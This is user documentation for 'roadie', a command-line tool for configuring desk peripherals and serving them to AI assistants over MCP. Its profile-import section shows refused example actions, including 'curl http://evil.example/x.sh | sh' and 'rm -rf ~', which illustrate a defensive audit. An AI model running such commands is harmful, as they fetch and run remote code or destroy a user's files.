# Usage (CLI)

The `roadie` command-line tool. For install and configuration, see the
[README](../README.md). To check this build against your own peripherals, see
[VERIFYING.md](VERIFYING.md).

```sh
roadie list                 # paired devices: slot, codename, kind, online, battery
roadie devices              # everything plugged in, whoever made it, and what it offers
roadie doctor               # why nothing is being found, and what to do about it
roadie assets sync          # pre-fetch device renders from the fastest available mirror
roadie diag features        # dump every HID++ feature the active device reports
roadie diag controls        # dump reprogrammable controls and capability flags
roadie diag dpi             # read → write → read-back → restore DPI (smoke test)
roadie diag smartshift      # toggle SmartShift and restore (smoke test)
roadie diag lighting ff0000 # solid colour for a wired RGB keyboard (any RRGGBB hex)
roadie streamdeck           # list attached Elgato Stream Decks
roadie streamdeck verify    # check the Stream Deck driver against your hardware
roadie streamdeck fill 0 ff8800   # fill the top-left key with a colour
roadie streamdeck image 0 icon.png # show a picture on the top-left key
roadie streamdeck label 0 "MUTE MIC"  # write a label, sized to fit
roadie streamdeck layouts             # the layouts you have saved, by name
roadie streamdeck example streaming   # start a layout called "streaming"
roadie streamdeck set streaming 0 --label "MUTE MIC"  # set a key, no editor needed
roadie streamdeck apply streaming     # apply it by name, from anywhere
roadie streamdeck run streaming       # apply it, then act on key presses
roadie via                  # QMK/VIA keyboards and macro pads attached
roadie via keymap 0         # print layer 0, key by key, with names not numbers
roadie via set 0 2 3 F13    # make one key send F13, confirmed by reading it back
roadie light list           # standalone lights (Litra) and what each can do
roadie light brightness 60  # set a light's brightness
roadie backlight status     # keyboard backlight state; `on` and `off` persist it
roadie snapshot shot.png    # capture one frame from a webcam
roadie mcp                  # serve the agent to an AI assistant over MCP (see below)
roadie profile export my-setup # save the whole setup — configuration and layouts
roadie profile inspect FILE # show what a profile holds, without applying it
roadie profile import FILE  # apply a profile, backing up the current one first
```

## When nothing is found

`roadie doctor` is the command to run when something is not working. Every
other command here assumes it can reach your hardware; when it cannot, the most
it can honestly say is "nothing found" — and that is the same sentence whether
your desk is empty, a cable is out, or this program is not allowed to open the
devices sitting right in front of it. Those have completely different answers,
and the first is almost never the real cause.

`doctor` checks each thing in turn — permission to open devices, whether
anything was found, the background agent, where configuration lives, saved
layouts — and for anything wrong, says what to do about it:

```console
$ roadie doctor
FIX   Permission to open devices: 4 HID devices are attached and this program
      cannot open any of them. This is a permissions problem, not a hardware
      one — the devices are there.
...
One thing to fix:

Permission to open devices: ...
  1. Install the udev rules this project ships: sudo cp
     packaging/linux/udev/70-roadie.rules /etc/udev/rules.d/
  2. Those rules name the vendors this program drives, and the device(s) you
     cannot open are not among them. Put this line in
     /etc/udev/rules.d/71-roadie-local.rules — a separate file, so upgrading
     this program does not overwrite it:
  3.     SUBSYSTEM=="hidraw", ATTRS{idVendor}=="0fd9", TAG+="uaccess"
  4. Reload the rules without rebooting: sudo udevadm control --reload-rules && sudo udevadm trigger
  5. Unplug the device and plug it back in — a rule applies when a device
     appears, so one already attached keeps the permissions it was given.
  6. Run roadie doctor again to confirm.
```

That third line is the point. The shipped rules name the vendors this program
drives rather than matching every HID device — a wildcard would hand the
logged-in user every HID device on the machine, which is a much worse trade
than one extra line of setup. So a peripheral from a vendor not on that list
needs a rule, and `doctor` reads the vendor id off the device you cannot open
and writes the line for you. "Add a udev rule" is a research task; a line with
the right four hex digits already in it is a step.

Three things about that output are deliberate. **The steps are repeated at the
end as one numbered list**, because someone who has just heard five checks read
out should not have to scroll back to find the two things they have to do.
**Permission is checked before "nothing found"**, because the first causes the
second and fixing them the other way round fixes nothing. And **a missing
background agent is a note, not a problem** — nothing in the CLI needs one, and
a diagnostic that calls a working setup broken loses the trust that makes it
useful.

Exit status `2` means it checked successfully and found something to fix, which
is not the same as the command failing.

`--json` prints the same findings as machine-readable data, steps included, for
a script or another tool. The exit status is identical either way, so adding
the flag never changes how a script behaves.

## Everything plugged in

`roadie list` answers "which Logitech devices are paired". `roadie
devices` answers a different question: **what is on this desk, and what can
this program do with each of it** — whoever made it.

It surveys every HID device and every camera the OS reports, collapses the
several HID collections one physical device exposes into a single entry, and
sorts what it finds into three groups:

- **Configurable now** — a driver in this build handles it. Each entry says
  what that driver actually lets you change and which command to reach it
  with, so the listing is also the instructions.
- **Wireless receivers** — a Unifying or Bolt receiver is supported, but it is
  a way in rather than a peripheral; the mice and keyboards paired to it are
  what `roadie list` shows. Filing it under "unsupported" would tell you your
  mouse was not going to work, which is the opposite of the truth.
- **Detected, not configurable by this build** — everything else. These are
  never hidden. A device the hub cannot drive is still a device you own, and
  omitting it is how vendor software leaves people unable to tell "not
  supported" from "not plugged in". Each line carries the vendor and product
  ids, which are exactly what a device-support request needs.

The closing line gives a total, because a long list read aloud needs one.
`--supported` narrows the listing to what can be configured, and still prints
the full count so a shorter list does not read as a smaller desk.

`--json` prints the same survey as machine-readable data — literally the same
rendering the MCP `list_peripherals` tool returns, so a script and an assistant
looking at the same desk cannot be told different things. The totals stay
truthful under `--supported` there too.

Cameras are in the list whoever made them. UVC is a class standard rather than
a per-vendor protocol — the same brightness, exposure, focus and zoom
registers answer on an Elgato Facecam, an Obsbot, or a laptop's built-in
camera — so a camera is supported because of what it is, not because of who
made it.

If nothing at all is reported, the command says so and names the likely cause:
on Linux that is almost always the udev rules rather than an empty desk, and
on macOS a missing Input Monitoring grant. "Nothing found" on its own would
send you to check your cables.

## Stream Decks

`roadie streamdeck` lists every Stream Deck collection the OS reports;
`brightness`, `reset`, `watch`, `fill`, `image` and `clear` drive an attached
device. `apply` and `run` work from a layout file.

Keys are numbered from 0 at the top left, running left to right then down, and
every command that takes a key also prints its row and column — so "key 7" and
"row 2, column 3" always appear together and you never have to count squares.

### Layouts

Nothing a Stream Deck shows survives unplugging it — the images live in the
device's volatile memory and go when it loses power. A layout file is where a
deck's appearance actually lives:

```toml
brightness = 80

[[keys]]
index = 0
label = "MUTE MIC"
background = "802020"

[[keys]]
index = 2
image = "icons/camera.png"
```

`roadie streamdeck example streaming` writes one to start from, and
`roadie streamdeck apply streaming` applies it. Image paths are relative to
the layout file, so a layout and its icons travel together. Neither the example
nor a parse error needs a device attached, so you can write and check a layout
before the hardware arrives.

### Building a layout without a text editor

You never have to open a layout file. `roadie streamdeck set` writes one key
at a time:

```sh
roadie streamdeck set mydeck 0 --label "MUTE MIC" --background 802020
roadie streamdeck set mydeck 1 --label REC --colour ff4040 --action Copy
roadie streamdeck unset mydeck 1
```

There is no need to run `example` first — the first key you set *is* the
layout. For anyone this saves a step; for anyone working by dictation, editing
TOML by hand is the difference between this feature being usable and not, which
is why it works this way.

Three things about it are deliberate:

**Setting a key replaces it, it does not merge.** Saying `--label` again gives
you the second label and nothing else. A command that quietly kept the old
background underneath new words would produce a key you did not ask for.

**Mistakes are caught while you are still thinking about that key** — a colour
that is not six hex digits, an action name this build does not know, or asking
for words and a picture on the same key. Finding out at apply time, with the
deck in front of you, is too late to be useful.

**Removing a key that was not there says so**, and exits `2`. Told "removed",
you would believe something changed and then wonder why the deck looks the
same.

Keys are kept in deck order in the file however you set them, so a layout in
git does not churn because of the order you happened to type things.

An action that carries a value — `RunShellCommand`, `TypeText` — has to be
written in the file rather than passed here. That is not an oversight: those
are the actions `run` refuses without `--accept-actions`, and adding one should
be a deliberate act of editing, not a flag on a convenience command.

### Your file stays your file

`set` and `unset` edit the layout's text rather than rewriting it from what
they parsed, so the comments you wrote, your blank lines, and the order you put
things in all survive an edit. So do the file's line endings and its
byte-order mark if it has one — a layout written on Windows stays a file written
on Windows, rather than coming back with every line changed. That is the same choice OpenRoadie already made
for `config.toml`; layouts were simply missed.

It matters most for the person least able to notice: a rewrite reports success,
the layout still works, and the only thing gone is the note you left yourself
about which key is the mic mute. Nothing on screen changes, and there is no
reason to re-read a file that said it worked.

A new key is appended rather than sorted into place. Sorting would move whole
blocks around, and a comment at the top of the file — which is attached to
whatever comes first — would travel with it. Nothing downstream cares about the
order.

### Layouts have a home

A bare word is a **name**: `streaming` means the layout saved under that name,
in `layouts/` inside your configuration directory. Anything with a slash or a
`.toml` on the end is a **path**, used as written — a layout kept in a git
repository beside the project it belongs to is a perfectly good place for it.

`roadie streamdeck layouts` lists what you have saved. A layout name is a plain name — no slashes, and no control characters, because the name becomes the filename and the listing prints one per line. A file in that folder whose name breaks that rule is counted and reported rather than listed, so it cannot make the listing disagree with its own count. Naming layouts rather
than remembering paths is the smaller half of why the library exists; the
larger half is that a profile bundle can then gather them, so moving to another
computer moves your decks too. See portable profiles below.

`example` will not write over a layout that already exists. The deck's own
memory is not a copy of the file — it goes when the cable does — so an
overwrite would leave nothing to restore from.

A layout is checked before anything is written: a key the attached model does
not have, the same key listed twice, a key with both a label and an image, or
one with nothing at all, are all refused with nothing half-applied. A
misspelled field is refused too rather than silently ignored — a key that just
stays blank tells you nothing.

### Making keys do things

A face is half a macro pad; `action` is the other half:

```toml
[[keys]]
index = 3
label = "COPY"
action = "Copy"
```

`roadie streamdeck apply` only paints the faces. Applying a layout that has
actions on it says so, because a deck that looks exactly right and does
nothing is indistinguishable from a broken one. `roadie streamdeck run
deck.toml` applies the layout and then stays running: each time you press a
bound key, its action fires. Actions come from the same catalogue every other
device here uses, so a Stream Deck key and a mouse button are bound the same
way and mean the same thing — `"Copy"`, `"NextTab"`, `"VolumeUp"`,
`{ CustomShortcut = "cmd+shift+4" }`, and the rest. A key may carry an action
with no label or image, if you want it to do something without showing
anything; only a key with no face *and* no action is refused.

Actions fire on the press, not the release, so a key does its thing once per
push rather than twice.

If the deck is unplugged while `watch` or `run` is going, the command says so
in those words and exits with status 5, distinct from a failure. It does not
reconnect on its own: plug it back in and run the same command again. The deck
gives you no clue by itself — its faces stay lit until it loses power, and the
keys simply stop doing anything.

Actions run on their own thread, in the order the keys were pressed. A key
bound to a build, or to anything else that takes its time, therefore delays the
actions queued behind it but does not stop the deck reading key presses — a
deck that stops responding is indistinguishable from a cable that has come out.

Some actions run a program or type text — `RunShellCommand`, `RunAppleScript`,
`OpenApplication`, `TypeText`. A layout carrying any of those is **refused
before the device is even opened**: nothing is applied and nothing is bound.
The refusal names each one and where it is, so you can read them before
deciding. `--accept-actions` proceeds anyway, and is deliberately your
decision rather than a default — it is the same rule, and the same list, that
`roadie profile import` applies to a profile from somewhere else. A layout
file is a thing people will send each other, and a key that silently runs a
command when pressed is exactly the shape a malicious one would take.

### Keys

`label` writes words on a key, wrapped and sized to fill it — a key that says
what it does. That matters beyond convenience: the label is text the system
holds, so it can be read back, searched and spoken, and the picture on the key
is a rendering of it rather than its identity. Capitals, digits and common
punctuation are drawn; lowercase is drawn as capitals, which are more legible
at this size.

A label the font cannot draw — accented letters, Japanese, an emoji — renders
each unsupported character as a hollow box, and the command **says so**, naming
the characters. That box is perfectly visible if you can see the deck and tells
you nothing at all if you cannot, while the command otherwise reports plain
success. Use a picture for anything the font does not carry.

`fill` takes six hex digits; `image` takes any common picture file and scales
and rotates it to fit the key, so you do not have to know the model's screen
size or which way its panel is mounted. Transparency is composited onto black, which is what the key is. Dropping the
alpha channel instead keeps whatever colour the exporting tool left underneath
it — often black, so it looks right by accident, and often white, in which case
an icon arrives as a solid white key with the artwork lost inside it.

A picture that is not square is scaled
to fit inside the key and centred on black rather than stretched to fill it —
a wide logo arrives smaller, not squashed into a shape you did not choose.

**`roadie streamdeck verify` is worth running first.** It now checks the
write path as well as the read path: it dims and restores the screens, paints
the top-left key orange, and then asks you to press that same key. If a
*different* key turns orange, key numbering is wrong for that model; if the
colour appears but looks rotated, the catalogue's rotation is wrong; and if the
key you press reports as anything other than row 1, column 1, the key ordering
is wrong. Each of those is a distinct, reportable finding rather than a vague
"it didn't work". The Stream Deck
protocol layer is thoroughly unit-tested but has never met a physical device,
and two things cannot be settled without one: which HID collection carries the
key traffic, and whether the original 2015 Stream Deck reports its keys
mirrored within each row. `verify` exercises both — it prints every collection
found and which one the driver chose, dims and restores the screens, then asks
you to press the top-left key and says whether that key arrived where the
catalogue expects it:

```console
$ roadie streamdeck verify
...
Saw: key 0 pressed (row 1, column 1)

CORRECT — the top-left key reported as row 1, column 1.
Key ordering for this model is right.
```

A `MISMATCH` line instead means the catalogue is wrong for that model, and the
output is written to be pasted straight into an issue.

If no Stream Deck is found, the command distinguishes "nothing is attached"
from "an Elgato device is attached that this build does not recognize", and
prints the product id a catalogue entry needs in the second case. Those look
identical to a user and have completely different answers.

Running `roadie` with no subcommand defaults to `list`. Set
`ROADIE_LOG=debug` for verbose tracing in the CLI, GUI, or agent.

## Output written to be heard

For someone who cannot see the screen, the command line is not a fallback
interface — it is often the only one. So the output here follows rules, and
those rules are checked rather than remembered:

- **Counts use words.** "1 device", never "1 device(s)" — a screen reader says
  "device open paren s close paren", every time, in every line.
- **No drawn rules, boxes, or tick marks.** A line of `====` is heard as
  repeated punctuation or as nothing at all, box-drawing characters are read
  one per character, and a tick alone carries meaning that a listener never
  receives. Anything a symbol would say is said in a word as well.
- **Every status line is labelled.** `doctor` prefixes each check with `OK`,
  `NOTE` or `FIX`, so nothing depends on colour or position.

A test sweeps the rendered output of every command for those patterns. It runs
over synthesized reports as well as real runs, because output that needs
hardware to produce cannot be checked by running the program on a machine with
none — which is every machine this project is developed on.

## Monitors

`roadie display` reaches the settings behind your monitor's own menu —
brightness, contrast, input, volume — over the video cable, using DDC/CI. That
menu is drawn by the monitor itself, in its own font, where no screen reader
can read it, so for anyone working by ear this is not a convenience: it is the
only way in.

Your laptop's built-in screen will never appear. It has no DDC channel at all,
and its brightness is a system setting rather than a monitor one.

```sh
roadie display list
```

names each monitor from its own identification block — "LG ULTRAFINE" rather
than a port number — and says whether it answers. A monitor that is listed and
does not answer is still worth listing: on Linux the reason is usually that the
I²C devices belong to the `i2c` group and you are not in it, and the message
says so. The other common cause is DDC/CI switched off in the monitor's own
menu, where a great many ship it off.

```sh
roadie display brightness 40
roadie display get contrast
roadie display set input hdmi2
```

Brightness takes a percentage. Everything else takes the monitor's own number,
or a name where it has one — `hdmi1`, `dp2`, `standby`. `roadie display
capabilities` asks the monitor what it has, which is the only reliable list:
the numbers above `0x12` for inputs are vendor territory, and USB-C in
particular has no standard number at all.

Two writes are refused unless you insist, and both refusals name what you
would have to do to undo them. Powering a monitor off can stop it answering the
computer entirely, leaving the button on its bezel as the only way back;
`roadie display save` writes to the monitor's own memory, which can only be
rewritten a limited number of times. Neither happens by accident.

## Lights, backlight, and snapshots

Three commands inherited from upstream, listed here because `roadie devices`
now points at them and a command it names should be one you can read about.

`roadie light` drives the lights on your desk, whichever way they are reached:
a Logitech Litra over USB, and an Elgato Key Light over Wi-Fi. They share one
command rather than having two, because the question you are asking is "what
lights do I have" and an answer covering only the ones on a cable would be
worse for sounding complete.

`list` shows each light and what it is doing, and `on`, `off`, `brightness`
and `temperature` change it. Brightness takes a percentage for either family,
or native lumens for a Litra; temperature takes Kelvin for both — an Elgato
light actually counts in mireds, which run backwards, and the conversion is
done for you.

Elgato lights are found by asking the network, which takes a couple of seconds
and needs them to be on the same network as this computer. `--no-network` skips
the look if all your lights are on USB, and `--wait` changes how long it
listens. If you have more than one light, `--device` takes part of a name — the
name you gave it in Elgato's app — or part of its address, and an ambiguous
name is refused with both candidates listed rather than guessed at.

`roadie backlight` reads or sets a keyboard's backlight over HID++, and `on`
and `off` are persistent — the keyboard keeps the setting rather than reverting
when ambient light changes. `--device` picks between several paired keyboards
by name.

`roadie snapshot` captures one frame from a webcam to a PNG, which is the
quickest way to see what a camera setting actually did.

## QMK and VIA macro pads

`roadie via` reads and changes what each key sends on any QMK keyboard or
macro pad whose firmware was built with VIA enabled. That is one implementation
for hundreds of boards — the same bargain UVC gives us for cameras, and the
reason "support every macro pad" is a tractable goal rather than a per-vendor
slog.

- `roadie via` (or `via list`) — every attached board, and what each reports:
  its VIA protocol revision and how many keymap layers it holds. Matching the
  HID collection only makes a device a *candidate*; the protocol exchange this
  performs is what confirms one, which is why `roadie devices` files an
  unopened board under "probably configurable" rather than promising it works.
- `roadie via keymap [layer]` — print a whole layer, key by key. Unassigned
  and pass-through positions are skipped and counted rather than printed: on
  any layer above the first they are nearly the whole matrix, and listing them
  would bury the keys that exist. The count at the end means nothing goes
  missing silently.
- `roadie via get <layer> <row> <column>` — one position.

Reading a keymap is one USB round trip per position, and VIA gives no way to
ask a board how big its matrix is — so the read covers an area you choose, and
stops at 32 by 32 however much more is asked for. That is roughly twice the
largest edge any real board has. A read cut down says so, because a scan that
quietly stopped short looks exactly like a keyboard with nothing on it.

- `roadie via set <layer> <row> <column> <key>` — assign a key.

Keys are named, not numbered: `F13`, `KC_F13`, `f13` and `0x0068` all work, and
what comes back is `F13` rather than `0x0068`. A keymap dumped as numbers tells
nobody anything; dumped as names it is something you can reason about, say out
loud, and write down.

Every answer from the board is checked against the question: not just that it
replied to the right command, but that it replied about the right key. Every
keycode reply carries the same command byte, so the command alone cannot tell
one position's answer from the previous one's — and `keymap` walks the matrix
in a tight loop, where a single stale report would shift every answer after it
and print a keymap that is confidently wrong.

### Why `set` is careful

A wrong keycode written to a keyboard takes a key away from whoever is using
it, and this tool is then the tool they have to use to fix it. So:

- The protocol revision is checked before anything is written. VIA's payload
  layouts have changed between revisions, and a board reporting one this build
  does not implement is **refused rather than guessed at**.
- A board that goes quiet is given two seconds and then reported, rather than
  waited on. A command that hangs with nothing on screen is indistinguishable,
  working by ear, from the program having crashed — which makes it a worse
  outcome than any error message.
- A key name that cannot be resolved is refused before the device is even
  opened — the name is wrong whether or not a keyboard is attached, and "no VIA
  device found" would send you hunting the wrong problem.
- Every write is read back and compared. A write that silently did not take
  would leave you pressing a key that does the old thing while the tool insists
  it changed; a mismatch is reported with both values instead.
- Every `set` prints the exact command to undo it, whether or not the change
  looks risky. The moment you need that is after you have closed the terminal.

Only single-key assignment is implemented. Macros, layer-switching keycodes and
QMK's quantum keycodes are real and worth adding, but their numbering is QMK's
own rather than a published standard's, and a wrong entry would rename a key
that is not what it claims — or be written back to a board. An unnamed keycode
renders here as its number, which is honest; a misnamed one would not be.

`doctor` checks that devices can be *written to*, not only opened. This program
changes settings, so a rule that grants reading and not writing — `MODE="0644"`
where `0660` was meant — leaves every listing working and every change failing,
which is the most confusing shape a permissions problem takes. The rules this
project ships use `TAG+="uaccess"`, which grants both.

## TourBox controllers

`roadie tourbox` finds TourBox controllers and says what each button, knob and
dial sends.

A TourBox is not a HID device, which is the whole reason it needs its own
command. It presents a USB serial port and streams one byte per event, so none
of the HID enumeration the rest of this program does will ever see one.

- `roadie tourbox` (or `tourbox list`) — every controller attached, with the
  port it is on and how many buttons and wheels it has.
- `roadie tourbox listen` — name each button press and wheel turn as it
  arrives, out loud. This is how you check a controller against this build
  without being able to see it: press something and hear what it was.
  `--quiet-seconds` sets how long it waits before giving up, and `--port`
  names a serial port for a controller this build cannot recognise on its own.

Two things worth knowing before reporting one as broken:

**The cable decides whether the controller exists at all.** A charge-only
USB-C cable carries power but no data, so the TourBox lights up and never
appears to the computer. That was the actual cause the first time this project
met one, and it is indistinguishable from a dead controller until you swap the
cable.

**Only the Elite is recognised automatically.** A TourBox Neo reaches the
computer through a general-purpose serial adapter whose USB identity is shared
with a great many unrelated devices, so recognising a Neo by its numbers would
mean claiming every USB-to-serial adapter on the machine was a controller.
Name its port with `--port` instead. This is the same honesty the survey
applies elsewhere: a guess that is usually right is still a guess.

## Portable profiles

`roadie profile export` saves this machine's setup somewhere you can carry it
— a USB stick, a network share, whatever you already trust. `roadie profile
import` applies it there, copying the existing configuration aside first so the
change is always reversible. On a machine that has never run OpenRoadie there is
nothing to back up, and the import says so.

### One file, or the whole setup

Where you export to decides what you get, and the command tells you which it
wrote:

```console
$ roadie profile export my-setup
setup written to my-setup
  configuration: config.toml
  2 layout(s): streaming, work
Copy the whole folder to another machine and apply it with: roadie profile import my-setup
```

A path ending in `.toml` writes the **configuration alone**, as one file:
bindings, per-app overlays, camera settings. Any other path writes a **bundle**
— a folder holding that same configuration plus every saved Stream Deck layout,
icons included. `import` takes either.

Exporting again over an earlier bundle copies in without deleting anything, so
a layout you have removed since is still in that folder. The export names those
rather than removing them: that folder is a path you chose, and quietly
deleting inside it is not a risk worth taking for tidiness. Importing works the
same way in reverse — a layout this machine already had survives an import that
does not mention it, because an import adds a setup rather than replacing the
machine.

A bundle is a folder rather than a zip on purpose. The promise this project
makes is that your settings are plain text you can read and edit, and an
archive would take that back for the sake of one fewer thing to copy. A folder
can be read, diffed, and kept in git, and every tool you already have can move
one.

Exit status `4` on an import means the configuration landed but the layouts did
not — half the setup in place, which is neither success nor a clean failure,
and the message says which half.

A configuration is not inert data: it can bind a button to a shell command, an
AppleScript, an application launch, or typed text. Importing a profile someone
sent you is therefore closer to running their script than to loading their
settings. Import audits first and **refuses by default**, listing exactly what
it found and where:

```console
$ roadie profile import theirs.toml
this profile contains 2 action(s) that would run a program or type text on your
machine. Nothing has been imported. Review them, then re-run accepting them if
you trust the source:
  keyboard.bindings.f13: RunShellCommand — curl http://evil.example/x.sh | sh
  keyboard.bindings.f14: TypeText — rm -rf ~
```

The list of what counts as risky is not maintained by hand alone: a test reads every action variant out of the deserializer itself and fails until each one is classified as risky or reviewed-safe. An action added later that runs something would otherwise pass the audit silently, on the one code path whose whole job is refusing that.

`roadie profile inspect` shows the same report without applying anything, and
`--accept-actions` on `import` is how you say you trust the source. Key chords
are not flagged: they are the ordinary substance of a profile, and flagging
every one would train you to wave the whole audit through.

Exit status `3` means a profile was refused for this reason, distinct from a
read or parse failure, so a script can tell them apart.

### What a profile does not carry, and why

A monitor's brightness and an Elgato light's colour temperature are not in it,
and that is deliberate rather than an omission. Those settings live in the
device, not in this program's configuration — the monitor keeps its own
brightness whichever computer is plugged into it, and a Key Light keeps its own
whether anything is talking to it at all. Carrying them to another machine
would mean reaching across and changing hardware that already has an answer.

A Logitech Litra is the exception that shows the rule. Its settings *are* in
the configuration, because OpenRoadie is what applies them — the light has no
opinion of its own until something on USB tells it one, so there is something
to carry.

So after an import, expect your remapping, your profiles and your Stream Deck
layouts to be there, and expect your monitor to be exactly as bright as you
left it.

## Model Context Protocol server

`roadie mcp` serves the running agent to an AI assistant over the Model
Context Protocol, so a device can be inspected and changed by asking for it in
prose rather than through the GUI. It speaks newline-delimited JSON-RPC on
stdin and stdout — the stdio transport MCP clients launch themselves — so it
opens no network port and is reachable only by the process that started it.

It is not a daemon and is not started by hand: an MCP client runs it on demand.
Most clients take a JSON entry naming the command and its arguments,

```json
{
  "mcpServers": {
    "roadie": {
      "command": "roadie",
      "args": ["mcp"]
    }
  }
}
```

and clients that register servers through their own CLI instead take the same
`roadie mcp` command and argument. Use an absolute path to the binary if it is
not on the client's `PATH`, which is often narrower than a login shell's.

The tools exposed are:

| Tool | What it does |
|---|---|
| `list_peripherals` | Every peripheral attached, whoever made it, and what each offers |
| `list_devices` | Logitech HID++ devices, with agent health and a route per device |
| `read_dpi` / `set_dpi` | Pointer resolution, and the values the sensor supports |
| `read_smartshift` / `set_smartshift` | Scroll-wheel mode and the speed the ratchet releases at |
| `set_lighting` | Backlight on/off, colour, brightness |
| `set_light` | A standalone light such as a Litra: power, brightness, colour temperature |
| `list_network_lights` | Elgato Key Lights on the network, and what each is doing |
| `set_network_light` | One Key Light: power, brightness and colour temperature, in a single request |
| `list_displays` | Monitors attached, whether each answers over DDC, and why not when it does not |
| `read_display_settings` | A monitor's brightness, input, contrast and volume, with the maximum it reports |
| `set_display_setting` | Change one monitor setting, reporting what the monitor actually took |
| `watch_input` | Watch for a few seconds and report what was pressed |
| `list_cameras` | Every attached webcam, of any brand, with the id the camera tools take |
| `read_camera_controls` | A webcam's controls with current values, accepted ranges, and auto modes |
| `set_camera_control` | Set one webcam control, checked against the range that camera reports |
| `reload_config` | Re-read `config.toml` |
| `export_profile` / `inspect_profile` / `import_profile` | Portable profiles, with the same audit as the CLI |
| `config_location` | Where this machine keeps its configuration file |
| `list_stream_decks` | Attached Stream Decks, with each one's key count and grid shape |
| `set_stream_deck_brightness` | A deck's key screen brightness |
| `set_stream_deck_key_colour` | Fill one key with a colour |
| `set_stream_deck_key_label` | Write a text label on one key, sized to fit |
| `clear_stream_deck` | Turn every key black |
| `list_layouts` / `apply_layout` | Saved deck layouts, restored whole by name |
| `set_layout_key` / `unset_layout_key` | Edit one key of a saved layout, reporting what it replaced |
| `list_keyboards` | QMK/VIA boards attached, with protocol revision and layer count |
| `read_keymap` | A layer's keys, by name rather than by number |
| `set_key` | Change what one key sends, confirmed by reading it back |
| `list_device_keys` | The devices whose buttons can be set, by the key the binding tools take |
| `list_actions` | Every action a button or Actions Ring slot can be set to, by name |
| `read_button_bindings` | What each button on one device does, and its Actions Ring |
| `set_button_action` | Set what one mouse or keyboard button does, and apply it |
| `set_action_ring_slot` | Set or empty one of the eight Actions Ring slots, and apply it |
| `list_audio_interfaces` | Focusrite Scarlett and Vocaster interfaces, with each input's gain, mute and phantom power |
| `set_audio_input` / `set_phantom_power` | Change an input's gain or mute; switch 48 volt phantom power off |
| `list_tourboxes` / `watch_tourbox` | TourBox controllers attached, and what each control sends |
| `diagnose` | Why devices are not being found, and the steps that fix it |

The binding tools take an action **by name only** — `Copy`, `BrowserBack`,
`VolumeUp` — the same rule `set_layout_key` follows. An action that runs a
program, runs a script or types text carries a value, so it cannot be named
here and stays the person's to write in `config.toml`. A change is saved to the
config and the agent is asked to apply it at once; if the OpenRoadie window is
open, reopen it to see the change.

The layout tools address layouts **by name only**. The command line takes a
name or a path, because someone who types a path means that path; this surface
does not, because its argument comes from a model that can be steered by
whatever it has been reading. A name that looks like a path is refused, and the
refusal points at `list_layouts` so the model corrects itself rather than
retrying.

`list_peripherals` is the one to reach for when the question is "what do I
have plugged in". It spans vendors, where `list_devices` covers only Logitech
HID++ devices — an assistant that reaches for the narrower tool will report an
empty desk to someone whose desk is full. Devices this build cannot configure
are included and marked, with a note telling the model to report them as
present but unconfigurable: a model told nothing about a device will say it is
not connected, which is the one answer guaranteed to be wrong.

The camera tools reach the device directly rather than through the agent, the
same way `roadie camera` does — UVC controls are a host-exposed class
standard, not agent-owned state, so on macOS the grant that matters is the
CLI's own. Enumeration there is deliberately **not** filtered by vendor: the
same UVC registers answer on an Elgato, an Obsbot or a built-in camera, so
restricting the list to one manufacturer would hide devices that are in fact
controllable.

`diagnose` is what an assistant should reach for when a device the person says
is plugged in does not appear. It hands back the same findings `roadie
doctor` prints, as data — and says plainly that the steps are for the person to
carry out, since only they can install system rules or grant access. A model
that reads "install the udev rules" as an instruction to itself will either
fail or, worse, try.

`apply_layout` exists so "put my streaming layout back" is one call rather than
thirty-two.

Editing a layout through an assistant took some deciding. The first version of
these tools deliberately had none: a layout is something a person composed, the
deck's own memory is not a copy of it, and an assistant rewriting one on a
misunderstanding would destroy work with nothing to restore from. That holds
against rewriting a *file* — and not against setting one key, which is what
people actually ask for. "Put MUTE MIC on the top left of my streaming layout"
is a sentence, and refusing it while the command line does it happily is a gap
in the interface a blind user relies on most.

So `set_layout_key` and `unset_layout_key` edit **one key at a time, never the
whole file**, and every change reports the key as it was, so the assistant can
offer to put it back. That is the same shape `set_key` takes for keyboards, and
for the same reason: a permanent change is acceptable when the answer carries
what it takes to undo it. Actions that run a program or type text still have to
be written in the file by the person — those are exactly what `run` refuses
without `--accept-actions`.

The keyboard tools take and give keys by name — `F13`, not `0x0068`. An
assistant relaying "your key is zero x zero zero six eight" has relayed nothing
usable. `set_key` reports what was there before the change, so the model can
offer to put it back, and an unrecognised name is refused with the vocabulary
that does exist rather than a bare rejection the model would only guess against.

The Stream Deck tools answer with a key's row and column as well as its index,
for the same reason the CLI does: an index alone is not something anyone can
act on while looking at a physical grid, and is not something a screen reader
can make sense of at all. So "set key 7" comes back as "key 7 (row 2, column
3)", and `list_stream_decks` gives the grid shape so a position can be turned
into an index in the first place.

`import_profile` is deliberately narrower than the CLI: it has no way to accept
a profile that runs programs. Whether a profile's source is trustworthy is a
judgement about provenance that a model cannot make, so it reports what it found
and leaves applying it to a person with `--accept-actions`.

Start from `list_devices`: its output carries, for every device, the route
object the other tools expect back verbatim, so routes are never assembled by
hand. `watch_input` answers the question a device list cannot — *which* button
is the one under your thumb: press it and the agent's hook reports what it saw,
which beats reading indices off a diagram and is the only workable route
without sight.

Everything runs through the same agent IPC the GUI and the rest of this CLI use
— the server holds no device handles of its own — and a tool call made while no
agent is running reports that instead of failing, so the assistant can say what
to start.

Asset synchronization probes `assets.roadie.org`, the versioned Cloudflare
Pages release alias, and the pinned jsDelivr npm release concurrently. The first
mirror with a valid catalog supplies every file for that synchronization run.
Set `ROADIE_ASSETS` or pass `roadie assets sync --base <URL>` to use one
uniform asset origin instead of automatic mirror selection.
